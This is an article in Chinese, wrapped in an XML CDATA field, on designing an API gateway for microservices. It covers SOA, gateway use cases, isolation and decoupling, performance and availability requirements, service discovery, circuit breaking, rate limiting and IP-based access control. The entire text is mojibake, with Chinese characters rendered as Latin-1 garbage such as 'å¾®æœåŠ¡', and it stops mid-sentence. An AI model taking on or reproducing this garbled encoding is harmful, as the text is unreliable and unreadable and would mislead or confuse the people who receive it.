    <content type="text"><![CDATA[å¾®æœåŠ¡æ¶æ„ä¸­é‚£äº›å•ä½“å¾®æœåŠ¡å…³æ³¨ä¸è‡ªèº«é¢†åŸŸ, è€ŒAPIGatewayå…³æ³¨æœåŠ¡å…¨è²Œ, æ‰€ä»¥ä»–æ˜¯ä¸€ä¸ªç»Ÿç­¹è€…, å¾ˆå¤šå…¨å±€éƒ½éœ€è¦çš„åŠŸèƒ½éœ€è¦åœ¨APIGatewayå¤„è¿›è¡Œå®ç°, è¿™ç¯‡æ–‡ç« æ˜¯è®¾è®¡ä¸€ä¸ªAPI Gatewayçš„æ¦‚è¿°, è®²è¿°APIç½‘å…³çš„éœ€æ±‚ã€ä»·å€¼ã€ä»¥åŠè®¾è®¡è¦æ±‚ã€‚ SOAè®¾è®¡æ–¹æ³•SOAæ˜¯ä¸€ç§æ¶æ„çš„è®¾è®¡æ–¹æ³•, å…¨ç§°æ˜¯Service-Oriented Architecture(é¢å‘æœåŠ¡çš„æ¶æ„)ï¼Œå®ƒå°†åº”ç”¨ç¨‹åºçš„ä¸åŒåŠŸèƒ½å•å…ƒæ‹†è§£æˆç‹¬ç«‹çš„æœåŠ¡, å¤šä¸ªæœåŠ¡ç›´æ¥é€šè¿‡è‰¯å¥½çš„æ¥å£å’Œå¥‘çº¦è”ç³»èµ·æ¥,é‡‡ç”¨ç½‘ç»œè¿›è¡Œé€šä¿¡ã€‚ SOAå¯ä»¥è®©è½¯ä»¶æ¶æ„è¾¾åˆ°æ¾è€¦åˆ, å¯ä»¥ç”¨æ¥åº”å¯¹è‡ƒè‚¿çš„å•ä½“åº”ç”¨, æ¯”å¦‚å¤šä¸ªç»ˆç«¯ç”¨æˆ·åº”ç”¨ç¨‹åºå¯ä»¥å…±äº«åŒä¸€ä¸ªæœåŠ¡, å®ƒçš„ç›®æ ‡æ˜¯åœ¨ä¸å½±å“å…¶ä»–ä»»ä½•äººçš„æƒ…å†µä¸‹é€æ˜åœ°æ›¿æ¢ä¸€ä¸ªæœåŠ¡,åªè¦æ›¿æ¢ä¹‹åçš„æœåŠ¡çš„å¤–éƒ¨æ¥å£æ²¡æœ‰å¤ªå¤§çš„å˜åŒ–å³å¯ã€‚è¿™ç§æ€§è´¨èƒ½å¤Ÿå¤§å¤§ç®€åŒ–è½¯ä»¶ç»´æŠ¤ç”šè‡³æ˜¯è½¯ä»¶é‡å†™çš„è¿‡ç¨‹ã€‚ ä»…ä»…è¾¾åˆ°æ¾è€¦åˆæ˜¯ä¸å¤Ÿçš„, æ¾è€¦åˆä¼šå¸¦æ¥å¤æ‚æ€§é—®é¢˜, å› æ­¤åŒæ—¶ä¹Ÿéœ€è¦é«˜å†…èš, APIç½‘å…³å°±æ˜¯ç”¨æ¥åšè¿™ä¸ªçš„, å› æ­¤å¯¹å¤–é‡‡ç”¨é«˜å†…èšçš„è¡¨ç°å½¢å¼æ¥é™ä½å¤æ‚æ€§, å¯¹å†…é‡‡ç”¨æ¾è€¦åˆçš„å®ç°æ–¹å¼æ¥åº”å¯¹å¿«é€Ÿå˜åŒ–çš„éœ€æ±‚ã€‚ èƒŒæ™¯ä»‹ç»APIç½‘å…³çš„æµè¡Œï¼Œæºäºè¿‘å‡ å¹´æ¥ï¼Œç§»åŠ¨åº”ç”¨ä¸ä¼ä¸šé—´äº’è”éœ€æ±‚çš„å…´èµ·ã€‚ç§»åŠ¨åº”ç”¨ã€ä¼ä¸šäº’è”ï¼Œä½¿å¾—åå°æœåŠ¡æ”¯æŒçš„å¯¹è±¡ï¼Œä»ä»¥å‰å•ä¸€çš„Webåº”ç”¨ï¼Œæ‰©å±•åˆ°å¤šç§ä½¿ç”¨åœºæ™¯ï¼Œä¸”æ¯ç§ä½¿ç”¨åœºæ™¯å¯¹åå°æœåŠ¡çš„è¦æ±‚éƒ½ä¸å°½ç›¸åŒã€‚è¿™ä¸ä»…å¢åŠ äº†åå°æœåŠ¡çš„å“åº”é‡ï¼Œè¿˜å¢åŠ äº†åå°æœåŠ¡çš„å¤æ‚æ€§ã€‚éšç€å¾®æœåŠ¡æ¶æ„æ¦‚å¿µçš„æå‡ºï¼ŒAPIç½‘å…³æˆä¸ºäº†å¾®æœåŠ¡æ¶æ„çš„ä¸€ä¸ªæ ‡é…ç»„ä»¶ã€‚ å®ƒç”¨äºå¤„ç†å¾ˆå¤šé€šç”¨çš„é—®é¢˜, æ¯”å¦‚è®¿é—®è®¤è¯ã€æŠ¥æ–‡è½¬æ¢ã€è®¿é—®ç»Ÿè®¡ã€æœåŠ¡å‘ç°ã€é™æµç­‰ç­‰ã€‚ ä½¿ç”¨åœºæ™¯ç‹å»¶ç‚¯åœ¨è°ˆAPIç½‘å…³çš„èƒŒæ™¯ã€æ¶æ„ä»¥åŠè½åœ°æ–¹æ¡ˆæœ‰å¦‚ä¸‹5ç§åœºæ™¯ä»‹ç»: é¢å‘Web Appçš„ç½‘å…³è¿™ç±»åœºæ™¯ï¼Œåœ¨ç‰©ç†å½¢æ€ä¸Šç±»ä¼¼å‰åç«¯åˆ†ç¦»ï¼Œæ­¤æ—¶çš„Web Appå·²ç»ä¸æ˜¯å…¨åŠŸèƒ½çš„Web Appï¼Œè€Œæ˜¯æ ¹æ®åœºæ™¯å®šåˆ¶ã€åœºæ™¯åŒ–çš„Appã€‚ é¢å‘MobileAppçš„ç½‘å…³è¿™ç±»åœºæ™¯ï¼Œç§»åŠ¨Appæ˜¯åç«¯Serviceçš„ä½¿ç”¨è€…ï¼Œæ­¤æ—¶çš„APIGWè¿˜éœ€è¦æ‰¿æ‹…ä¸€éƒ¨åˆ†MDMï¼ˆæ­¤å¤„æ˜¯æŒ‡ç§»åŠ¨è®¾å¤‡ç®¡ç†ï¼Œä¸æ˜¯ä¸»æ•°æ®ç®¡ç†ï¼‰çš„èŒèƒ½ã€‚ é¢å‘PartnerOpenAPIçš„ç½‘å…³è¿™ç±»åœºæ™¯ï¼Œä¸»è¦ä¸ºäº†æ»¡è¶³ä¸šåŠ¡å½¢æ€å¯¹å¤–å¼€æ”¾ï¼Œä¸ä¼ä¸šå¤–éƒ¨åˆä½œä¼™ä¼´å»ºç«‹ç”Ÿæ€åœˆï¼Œæ­¤æ—¶çš„API GWéœ€è¦å¢åŠ é…é¢ã€æµæ§ã€ä»¤ç‰Œç­‰ä¸€ç³»åˆ—å®‰å…¨ç®¡æ§åŠŸèƒ½ã€‚ é¢å‘PartnerExternalAPIçš„ç½‘å…³è¿™ç±»åœºæ™¯ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ»¡è¶³ä¼ä¸šè‡ªèº«ä¸šåŠ¡çš„éœ€è¦ï¼Œå®ç°å¯¹ä¼ä¸šè‡ªæœ‰ä¸šåŠ¡çš„æ˜ å°„ã€‚ä¸€ä¸ªå…¸å‹çš„ä¾‹å­å°±æ˜¯ä½¿ç”¨ã€Œåˆä½œæ–¹è´¦å·ç™»å½•ã€ã€ã€Œä½¿ç”¨ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°æ”¯ä»˜ã€ç­‰ç­‰ã€‚æ­¤æ—¶çš„APIGWå°±éœ€è¦åœ¨è¾¹ç•Œä¸Šï¼Œä¸ºä¼ä¸šå†…éƒ¨Service ç»Ÿä¸€è°ƒç”¨å¤–éƒ¨çš„APIåšç»Ÿä¸€çš„è®¤è¯ã€æˆæƒã€ä»¥åŠè®¿é—®æ§åˆ¶ã€‚ é¢å‘IoTSmartDeviceçš„ç½‘å…³è¿™ç±»åœºæ™¯ä¸»è¦åœ¨ä¼ ç»Ÿä¼ä¸šï¼Œå°¤å…¶æ˜¯å·¥ä¸šä¼ä¸šï¼Œä¼ æ„Ÿå™¨ã€ç‰©ç†è®¾å¤‡ä»å·¥ä¸šæ§åˆ¶åè®®å‘IPè½¬æ¢ï¼Œå¯¼è‡´ç‰©ç†é“¾è·¯ä¸Šä¼šå­˜åœ¨ä¸€éƒ¨åˆ†å…¬ç½‘é“¾è·¯ã€‚æ­¤æ—¶çš„API GWæ‰€éœ€è¦æ»¡è¶³çš„ã€Œå†…å¤–å…¼ä¿®ã€çš„åŒå‘æ•°æ®æµï¼Œè®¾å¤‡ä¸€èˆ¬é€šè¿‡ä¸€ä¸ªã€Œå®¢æˆ·ä¾§ã€çš„é›†ä¸­ç½‘å…³åœ¨å’Œä¼ä¸šçš„æ¥å…¥ç½‘å…³è¿›è¡Œé€šä¿¡ã€‚ åœ¨æˆ‘ä»¬è®²çš„å¾®æœåŠ¡æ¶æ„ä¸‹çš„APIç½‘å…³ï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯å‰ä¸¤ç§ä½¿ç”¨åœºæ™¯ã€‚å³ï¼Œä¸»è¦æ˜¯æŠŠä¼ä¸šå†…éƒ¨çš„APIèƒ½åŠ›ï¼Œæš´éœ²ç»™å…¶ä»–åº”ç”¨æˆ–åˆä½œä¼™ä¼´ä½¿ç”¨ã€‚ ç½‘å…³çš„ä»·å€¼ç½‘å…³å±‚ä½œä¸ºå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„ä¸€å±‚æŒ¡æ¿ï¼Œä¸»è¦èµ·åˆ°äº†ä¸‰å¤§ç±»ä½œç”¨: å†…å¤–éš”ç¦»: å¼ºè°ƒå®‰å…¨æ€§, ä¼ä¸šç³»ç»Ÿçš„è¾¹ç•Œ,éš”ç¦»å¤–ç½‘ç¯å¢ƒå’Œå†…ç½‘ç¯å¢ƒã€‚ æœåŠ¡è§£è€¦: æœ‰äº†ç½‘å…³å’ŒæœåŠ¡å±‚çš„è§£è€¦, ä½¿å¾—å¾®æœåŠ¡ç³»ç»Ÿçš„å„æ–¹èƒ½å¤Ÿç‹¬ç«‹ã€è‡ªç”±ã€é«˜æ•ˆã€çµæ´»åœ°è°ƒæ•´ï¼Œè€Œä¸ç”¨æ‹…å¿ƒç»™å…¶ä»–æ–¹é¢å¸¦æ¥å½±å“, ä¾¿äºå„ä¸ªå›¢é˜Ÿå·¥ä½œçš„ç‹¬ç«‹æ€§ã€‚ è¾…åŠ©åŠŸèƒ½: æä¾›äº†ä¸€ä¸ªåœ°ç‚¹ï¼Œæ–¹ä¾¿é€šè¿‡æ‰©å±•æœºåˆ¶å¯¹è¯·æ±‚è¿›è¡Œä¸€ç³»åˆ—åŠ å·¥å’Œå¤„ç†ã€‚ å†…å¤–éš”ç¦»ä¼ä¸šä¸ºäº†ä¿æŠ¤å†…éƒ¨ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå†…ç½‘ä¸å¤–ç½‘éƒ½æ˜¯éš”ç¦»çš„ï¼Œä¼ä¸šçš„æœåŠ¡åº”ç”¨éƒ½æ˜¯è¿è¡Œåœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œä¸ºäº†å®‰å…¨çš„è€ƒé‡ï¼Œä¸€èˆ¬éƒ½ä¸å…è®¸å¤–éƒ¨ç›´æ¥è®¿é—®ã€‚APIç½‘å…³éƒ¨ç½²åœ¨é˜²ç«å¢™å¤–é¢ï¼Œèµ·åˆ°ä¸€å±‚æŒ¡æ¿ä½œç”¨ï¼Œå†…éƒ¨ç³»ç»Ÿåªæ¥å—APIç½‘å…³è½¬å‘è¿‡æ¥çš„è¯·æ±‚ã€‚ç½‘å…³é€šè¿‡ç™½åå•æˆ–æ ¡éªŒè§„åˆ™ï¼Œå¯¹è®¿é—®è¿›è¡Œäº†åˆæ­¥çš„è¿‡æ»¤ã€‚ç›¸æ¯”é˜²ç«å¢™ï¼Œè¿™ç§è½¯ä»¶å®ç°çš„è¿‡æ»¤è§„åˆ™ï¼Œæ›´åŠ åŠ¨æ€çµæ´»ã€‚åœ¨å®‰å…¨çš„è§’åº¦è€Œè¨€, æ­¤æ—¶ç½‘å…³å……å½“ç€åº”ç”¨é˜²ç«å¢™çš„ä½œç”¨(WAF)ã€‚ æœåŠ¡è§£è€¦åœ¨å¾®æœåŠ¡æ¶æ„ä¸‹ï¼Œæ•´ä¸ªç¯å¢ƒåŒ…æ‹¬æœåŠ¡çš„æä¾›è€…ã€æœåŠ¡çš„æ¶ˆè´¹è€…ã€æœåŠ¡è¿ç»´äººå‘˜ã€å®‰å…¨ç®¡ç†äººå‘˜ç­‰ï¼Œæ¯ä¸ªè§’è‰²çš„èŒè´£å’Œè¿°æ±‚éƒ½ä¸åŒã€‚ä¾‹å¦‚ï¼šæœåŠ¡æ¶ˆè´¹è€…å·²ç»éœ€è¦æå‡ºä¸€äº›æ–°çš„æœåŠ¡éœ€æ±‚ï¼Œä»¥å¿«é€Ÿåº”å¯¹ä¸šåŠ¡å˜åŒ–ï¼›æœåŠ¡æä¾›è€…ï¼Œä½œä¸ºä¸šåŠ¡æœåŠ¡çš„æ²‰æ·€æ–¹ï¼Œå¸Œæœ›ä¿æŒæœåŠ¡çš„é€šç”¨æ€§ä¸ç¨³å®šæ€§ï¼Œå¾ˆéš¾åº”å¯¹å¿«é€Ÿçš„å˜åŒ–ã€‚æœ‰äº†APIç½‘å…³è¿™ä¸€å±‚ï¼Œå¯ä»¥å¾ˆå¥½çš„è§£è€¦å„æ–¹çš„ç›¸äº’ä¾èµ–å…³ç³»ï¼Œè®©å„æ–¹æ›´åŠ ä¸“æ³¨è‡ªå·±çš„ç›®æ ‡ã€‚ è§£è€¦åŠŸèƒ½ä¸éåŠŸèƒ½ä¼ä¸šåœ¨æŠŠæœåŠ¡æä¾›ç»™å¤–éƒ¨è®¿é—®æ—¶ï¼Œé™¤äº†å®ç°ä¸šåŠ¡é€»è¾‘åŠŸèƒ½å¤–ï¼Œè¿˜é¢ä¸´è®¸å¤šéåŠŸèƒ½æ€§çš„è¦æ±‚ã€‚ä¾‹å¦‚ï¼šéœ€è¦é˜²èŒƒé»‘å®¢æ”»å‡»ï¼Œéœ€è¦åº”å¯¹çªå‘çš„è®¿é—®é‡ã€éœ€è¦ç¡®è®¤ç”¨æˆ·çš„æƒé™ï¼Œéœ€è¦å¯¹è®¿é—®è¿›è¡Œç›‘æ§ç­‰ã€‚è¿™äº›éåŠŸèƒ½é€»è¾‘ï¼Œä¸èƒ½ä¸ä¸šåŠ¡é€»è¾‘çš„å¼€å‘æ··åœ¨ä¸€èµ·ï¼Œéœ€è¦æœ‰ä¸“ä¸šçš„äººå‘˜ç”šè‡³ä¸“ä¸šçš„å›¢é˜Ÿæ¥å¤„ç†ã€‚ è§£è€¦å®¢æˆ·ç«¯ä¸æœåŠ¡æä¾›è€…å®¢æˆ·ç«¯ä¸æœåŠ¡æä¾›è€…åˆ†å±äºä¸åŒçš„å›¢é˜Ÿï¼Œå·¥ä½œæ€§è´¨è¦æ±‚ä¹Ÿä¸ç›¸åŒã€‚å¯¹äºæœåŠ¡æä¾›è€…æ¥è¯´ï¼Œä»–ä¸»è¦çš„èŒè´£æ˜¯å¯¹ä¸šåŠ¡è¿›è¡ŒæŠ½è±¡ï¼Œæä¾›å¯å¤ç”¨çš„ä¸šåŠ¡åŠŸèƒ½ï¼Œä»–ä»¬éœ€è¦å¯¹ä¸šåŠ¡æ¨¡å‹è¿›è¡Œæ·±å…¥çš„æ€è€ƒå’Œæ²‰æ·€ï¼Œä¸èƒ½è½»æ˜“ä¸ºäº†å“åº”å¤–éƒ¨çš„éœ€æ±‚è€Œç ´åä¸šåŠ¡æ¨¡å‹çš„ç¨³å®šæ€§ã€‚è€Œä¸šåŠ¡çš„å¿«é€Ÿå˜åŒ–ï¼Œåˆè¦æ±‚ä¼ä¸šå¿«é€Ÿæä¾›æ¥å£æ¥æ»¡è¶³å®¢æˆ·ç«¯éœ€æ±‚ã€‚è¿™å°±éœ€è¦ä¸€ä¸ªä¸­é—´å±‚ï¼Œæ¥å¯¹æœåŠ¡å±‚çš„æ¥å£è¿›è¡Œå°è£…ï¼Œä»¥åŠæ—¶å“åº”å®¢æˆ·ç«¯çš„éœ€æ±‚ã€‚é€šè¿‡è§£è€¦ï¼ŒæœåŠ¡å±‚å¯ä»¥ä½¿ç”¨ç»Ÿä¸€çš„æ¥å£ã€åè®®å’ŒæŠ¥æ–‡æ ¼å¼æ¥æš´éœ²æœåŠ¡ï¼Œè€Œä¸å¿…è€ƒè™‘å®¢æˆ·ç«¯çš„å¤šç§å½¢æ€ã€‚é‚£ä¹ˆ ç½‘å…³å±‚æ˜¯å¦éœ€è¦å®ç°æœåŠ¡çš„ç¼–æ’ï¼Ÿåœ¨ä»‹ç»APIç½‘å…³çš„ä¸€äº›æ–‡ç« ä¸­ï¼Œæåˆ°äº†ç½‘å…³å±‚çš„æœåŠ¡ç¼–æ’èƒ½åŠ›ã€‚ä»è§£è€¦çš„è§’åº¦å‡ºå‘ï¼ŒæœåŠ¡çš„ç¼–æ’ä¸é€‚åˆåœ¨ç½‘å…³å±‚è¿›è¡Œã€‚å¯¹æœåŠ¡çš„ç¼–æ’ï¼Œå…¶å®æ˜¯æä¾›äº†ä¸€ç§ä¸šåŠ¡èƒ½åŠ›ï¼Œå¦‚æœæŠŠæœåŠ¡çš„ç¼–æ’æ”¾åœ¨äº†ç½‘å…³å±‚ï¼Œå®é™…ä¸Šæ˜¯æŠŠä¸€éƒ¨åˆ†ä¸šåŠ¡èƒ½åŠ›æ”¾åœ¨äº†ç½‘å…³å±‚ï¼Œè¿™æ ·ä¸€æ¥ï¼ŒæœåŠ¡å±‚ã€ç½‘å…³å±‚éƒ½æœ‰ä¸€äº›ä¸šåŠ¡èƒ½åŠ›ï¼Œé€ æˆå›¢é˜ŸèŒè´£çš„ä¸æ¸…ï¼Œä¹Ÿä¸åˆ©äºä¸šåŠ¡èƒ½åŠ›çš„æ²‰æ·€ã€‚ è¾…åŠ©åŠŸèƒ½ç½‘å…³å±‚é™¤äº†è¯·æ±‚çš„è·¯ç”±ã€è½¬å‘å¤–ï¼Œè¿˜éœ€è¦è´Ÿè´£å®‰å…¨ã€é‰´æƒã€é™æµã€ç›‘æ§ç­‰ã€‚è¿™äº›åŠŸèƒ½çš„å®ç°æ–¹å¼ï¼Œå¾€å¾€éšç€ä¸šåŠ¡çš„å˜åŒ–ä¸æ–­è°ƒæ•´ã€‚ä¾‹å¦‚æƒé™æ§åˆ¶æ–¹é¢ï¼Œæ—©æœŸå¯èƒ½åªéœ€è¦ç®€å•çš„ç”¨æˆ·+å¯†ç æ–¹å¼ï¼Œåç»­ç”¨æˆ·é‡å¤§äº†åï¼Œå¯èƒ½ä¼šä½¿ç”¨é«˜æ€§èƒ½çš„ç¬¬ä¸‰æ–¹è§£å†³æ–¹æ¡ˆã€‚åˆä¾‹å¦‚ï¼Œé’ˆå¯¹ä¸åŒçš„ç›‘æ§æ–¹æ¡ˆï¼Œéœ€è¦è®°å½•ä¸åŒçš„æ—¥å¿—æ–‡ä»¶ã€‚æ‰€ä»¥ï¼Œè¿™äº›èƒ½åŠ›ä¸èƒ½ä¸€å¼€å§‹å°±å›ºåŒ–åœ¨ç½‘å…³å¹³å°ä¸Šï¼Œè€Œåº”è¯¥æ˜¯ä¸€ç§å¯é…ç½®çš„æ–¹å¼ï¼Œä¾¿äºä¿®æ”¹å’Œæ›¿æ¢ã€‚è¿™å°±è¦æ±‚ç½‘å…³å±‚æä¾›ä¸€å¥—æœºåˆ¶ï¼Œå¯ä»¥å¾ˆå¥½åœ°æ”¯æŒè¿™ç§åŠ¨æ€æ‰©å±•ã€‚ æ€»ç»“æœ‰äº†APIç½‘å…³å, ä¼šæœ‰ä»¥ä¸‹ä¼˜ç‚¹ ç½‘å…³å±‚å¯¹å¤–éƒ¨å’Œå†…éƒ¨è¿›è¡Œäº†éš”ç¦»ï¼Œä¿éšœäº†åå°æœåŠ¡çš„å®‰å…¨æ€§ã€‚ å¯¹å¤–è®¿é—®æ§åˆ¶ç”±ç½‘ç»œå±‚é¢è½¬æ¢æˆäº†è¿ç»´å±‚é¢ï¼Œå‡å°‘å˜æ›´çš„æµç¨‹å’Œé”™è¯¯æˆæœ¬ å‡å°‘å®¢æˆ·ç«¯ä¸æœåŠ¡çš„è€¦åˆï¼ŒæœåŠ¡å¯ä»¥ç‹¬ç«‹å‘å±•ã€‚é€šè¿‡ç½‘å…³å±‚æ¥åšæ˜ å°„ã€‚ é€šè¿‡ç½‘å…³å±‚èšåˆï¼Œå‡å°‘å¤–éƒ¨è®¿é—®çš„é¢‘æ¬¡ï¼Œæå‡è®¿é—®æ•ˆç‡ã€‚ èŠ‚çº¦åç«¯æœåŠ¡å¼€å‘æˆæœ¬ï¼Œå‡å°‘ä¸Šçº¿é£é™©ã€‚ ä¸ºæœåŠ¡ç†”æ–­ï¼Œç°åº¦å‘å¸ƒï¼Œçº¿ä¸Šæµ‹è¯•æä¾›ç®€å•æ–¹æ¡ˆã€‚ ä¾¿äºæ‰©å±•ã€‚ è®¾è®¡è¦æ±‚é‚£ä¹ˆAPIç½‘å…³åœ¨è®¾è®¡æ—¶éœ€è¦è€ƒè™‘åˆ°é‚£äº›ç‚¹å–ƒï¼Ÿ é«˜æ€§èƒ½ç½‘å…³ä½œä¸ºåº”ç”¨è®¿é—®çš„å”¯ä¸€å…¥å£, æ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šç»è¿‡APIç½‘å…³è¿›è¡Œè½¬å‘, å¯æƒ³è€ŒçŸ¥, å¯¹APIç½‘å…³çš„è®¿é—®å‹åŠ›æ˜¯å·¨å¤§çš„ã€‚å› æ­¤APIç½‘å…³å¯¹æ€§èƒ½è¦æ±‚æ¯”è¾ƒé«˜, æ€§èƒ½ä¸Šè‡³å°‘ä¸èƒ½æ¯”nginxå¼±å¤ªå¤š, å› æ­¤ä¸šå†…ä½¿ç”¨nginx + luaçš„æ¯”è¾ƒå¤šã€‚ é«˜å¯ç”¨APIç½‘å…³ä½œä¸ºé€»è¾‘ä¸Šçš„å•ç‚¹ï¼Œä¸€æ—¦å‘ç”Ÿé—®é¢˜ï¼Œå°†é€ æˆæ‰€æœ‰æœåŠ¡çš„ä¸å¯ç”¨ï¼Œå¯¹ä¼ä¸šæ¥è¯´å¯èƒ½é€ æˆçš„è‡´å‘½çš„å½±å“ã€‚è®¡ç®—çŸ­æ—¶é—´çš„ä¸å¯ç”¨ï¼Œä¹Ÿä¼šç»™ä¼ä¸šå¸¦æ¥ç›´æ¥çš„ç»æµæŸå¤±ã€‚æ‰€ä»¥ï¼Œå¦‚ä½•ä¿è¯APIç½‘å…³çš„7*24å°æ—¶çš„ç¨³å®šè¿è¡Œ, å› æ­¤ ç½‘å…³åœ¨å®ç°æ—¶ä¸€å®šè¦è€ƒè™‘æ¨ªå‘æ‰©å±•å’ŒAPIçƒ­æ›´æ–°çš„èƒ½åŠ›, é¿å…APIç½‘å…³å®•æœºã€‚ é«˜æ‰©å±•å‰é¢è¯´åˆ°, ä¸€äº›éä¸šåŠ¡åŠŸèƒ½çš„éœ€æ±‚éœ€è¦ç½‘å…³æä¾›, æ¯”å¦‚: ä¾‹å¦‚æ—¥å¿—ã€å®‰å…¨ã€è´Ÿè½½å‡è¡¡ç­–ç•¥ã€é‰´æƒç­‰, è¿™å°±éœ€è¦ç½‘å…³å±‚æä¾›è¿™æ ·ä¸€ç§æœºåˆ¶ï¼Œä½¿å¾—å¯ä»¥çµæ´»åœ°è¿›è¡Œè¿™äº›è°ƒæ•´å’Œå˜åŒ–ï¼Œè€Œä¸ç”¨é¢‘ç¹å¯¹ç½‘å…³å±‚è¿›è¡Œæ”¹åŠ¨ï¼Œç¡®ä¿ç½‘å…³å±‚çš„ç¨³å®šæ€§ã€‚æ¯”å¦‚nginxé‡‡ç”¨æ¨¡å—æ¥è¿›è¡Œæ‰©å±•, å¹¶ä¸”æ”¯æŒæ¨¡å—çš„åŠ¨æ€åŠ è½½ã€‚ é«˜è¿ç»´APIåœ¨ä¸Šçº¿ã€å‘å¸ƒè¿‡ç¨‹ä¸­ï¼Œéƒ½éœ€è¦æ¶‰åŠåˆ°ç½‘å…³å±‚çš„é…åˆï¼Œä¾‹å¦‚ï¼Œéœ€è¦ç½‘å…³å±‚çŸ¥é“APIå‘å¸ƒçš„åœ°å€ï¼ŒAPIçš„æ¥å£å½¢å¼ã€æŠ¥æ–‡æ ¼å¼ï¼Œä¹Ÿéœ€è¦ç½‘å…³å±‚å¯¹åå°APIè¿›è¡Œå°è£…ã€‚åœ¨APIè°ƒæ•´åï¼Œéœ€è¦ä½œå‡ºç›¸åº”çš„ä¿®æ”¹ã€‚æ‰€ä»¥ï¼ŒAPIç½‘å…³è®¾è®¡æ—¶ï¼Œéœ€è¦æ˜ç¡®ç½‘å…³å±‚ä¸æœåŠ¡å±‚çš„èŒè´£åˆ‡åˆ†ä¸åä½œæ¨¡å¼ï¼Œä½¿å¾—APIçš„ç®¡ç†ã€å‘å¸ƒæ›´åŠ é«˜æ•ˆã€‚ è½åœ°æ–¹æ¡ˆé’ˆå¯¹ä»¥ä¸Šçš„éœ€è¦, å¦‚ä½•è®¾è®¡ä¸€æ¬¾è¿˜é è°±çš„APIç½‘å…³å–ƒ? è®¾è®¡åŸåˆ™ é«˜æ€§èƒ½: é‡‡ç”¨Golangæ¥è¿›è¡Œå¼€å‘, ç¡®ä¿æ€§èƒ½ é«˜å¯ç”¨: 1. ç½‘å…³å±‚é‡‡ç”¨æ— çŠ¶æ€è®¾è®¡, å°†è®¤è¯æ¨¡å—ç‹¬ç«‹å¤„ç† 2. ä¼˜é›…ä¸‹çº¿, é‡‡ç”¨go çš„gracefulåšå¤„ç† é«˜æ‰©å±•: é‡‡ç”¨httpä¸­é—´ä»¶çš„æ–¹å¼, æä¾›çµæ´»çš„æ‰©å±•èƒ½åŠ› åŠŸèƒ½ç‚¹ä¸€ä¸ªå®Œæ•´çš„APIç½‘å…³åº”è¯¥å…·æœ‰å¦‚ä¸‹å‡ æ–¹é¢çš„åŠŸèƒ½: æœåŠ¡å‘ç°, è´Ÿè½½å‡è¡¡, æœåŠ¡å¥åº·çŠ¶æ€æ£€æŸ¥API Gatewayéœ€è¦çŸ¥é“æ¯ä¸€ä¸ªå¾®æœåŠ¡çš„IPå’Œç«¯å£ã€‚åœ¨ä¼ ç»Ÿåº”ç”¨ä¸­ï¼Œä½ å¯èƒ½ä¼šç¡¬ç¼–ç è¿™äº›åœ°å€ï¼Œä½†æ˜¯åœ¨ç°åœ¨äº‘åŸºç¡€çš„å¾®æœåŠ¡åº”ç”¨ä¸­ï¼Œè¿™å°†æ˜¯ä¸ªç®€å•çš„é—®é¢˜ã€‚åŸºç¡€æœåŠ¡é€šå¸¸ä¼šé‡‡ç”¨é™æ€åœ°å€ï¼Œå¯ä»¥é‡‡ç”¨æ“ä½œç³»ç»Ÿç¯å¢ƒå˜é‡æ¥æŒ‡å®šã€‚ä½†æ˜¯ï¼Œæ¢æµ‹åº”ç”¨æœåŠ¡çš„åœ°å€å°±æ²¡é‚£ä¹ˆå®¹æ˜“äº†ã€‚åº”ç”¨æœåŠ¡é€šå¸¸åŠ¨æ€åˆ†é…åœ°å€å’Œç«¯å£ã€‚åŒæ ·çš„ï¼Œç”±äºæ‰©å±•æˆ–è€…å‡çº§ï¼ŒæœåŠ¡çš„å®ä¾‹ä¹Ÿä¼šåŠ¨æ€çš„æ”¹å˜ã€‚å› æ­¤ï¼ŒAPI Gatewayéœ€è¦é‡‡ç”¨ç³»ç»Ÿçš„æœåŠ¡å‘ç°æœºåˆ¶ï¼Œè¦ä¹ˆé‡‡ç”¨æœåŠ¡ç«¯å‘ç°ï¼Œè¦ä¹ˆæ˜¯å®¢æˆ·ç«¯å‘ç°ã€‚å¦‚æœé‡‡ç”¨å®¢æˆ·ç«¯å‘ç°æœåŠ¡ï¼ŒAPI Gatewayå¿…é¡»è¦å»æŸ¥è¯¢æœåŠ¡æ³¨å†Œå¤„ï¼Œä¹Ÿå°±æ˜¯å¾®æœåŠ¡å®ä¾‹åœ°å€çš„æ•°æ®åº“ã€‚å‘ç°äº†å¤šä¸ªå¾®æœåŠ¡çš„å®ä¾‹è¿‡å, éœ€è¦é‡‡ç”¨è´Ÿè½½å‡è¡¡æœºåˆ¶è¿›è¡Œè°ƒåº¦, å¹¶ä¸”éœ€è¦æ£€æŸ¥æœåŠ¡çŠ¶æ€, å½“æœåŠ¡ç¦»çº¿æ—¶, è¯·æ±‚å°†ä¸ä¼šè°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹ã€‚ ç†”æ–­æ¨¡å¼ä¹Ÿå«circuit breakæ¨¡å¼ï¼Œå®ƒå¯ä»¥å°†å®¢æˆ·ç«¯ä»æ— å“åº”æœåŠ¡çš„æ— å°½ç­‰å¾…ä¸­åœæ­¢ã€‚å¦‚æœä¸€ä¸ªæœåŠ¡çš„é”™è¯¯ç‡è¶…è¿‡é¢„è®¾å€¼ï¼Œå°†ä¸­æ–­æœåŠ¡ï¼Œå¹¶ä¸”åœ¨ä¸€æ®µæ—¶é—´å†…æ‰€æœ‰è¯·æ±‚ç«‹åˆ»å¤±æ•ˆã€‚å…·ä½“å¯ä»¥å‚è€ƒ: ç†”æ–­å™¨ é€Ÿç‡é™åˆ¶æ— è®ºå¦‚ä½• ä½ åç«¯çš„æœåŠ¡èµ„æºä¸å¯èƒ½æ— é™åŠ¨æ€æ‰©å±•, ç»ˆæœ‰è¯», ä¸ºäº†ä¿æŠ¤åç«¯æœåŠ¡ä¸è¢«å‡»å®, å¯ä»¥åœ¨ç½‘å…³å±‚åšè®¿é—®é€Ÿç‡çš„é™åˆ¶ã€‚ åŸºäºIPçš„è®¿é—®æ§åˆ¶è¿™ä¸ªæ˜¯WAFçš„åŸºæœ¬åŠŸèƒ½, é¿å…DOS, å°é”æŸä¸ªIPçš„æ¶æ„è®¿é—®ã€‚ åè®®è½¬æ¢ç½‘å…³æä¾›RESTfulçš„HTTPçš„æ¥å£, 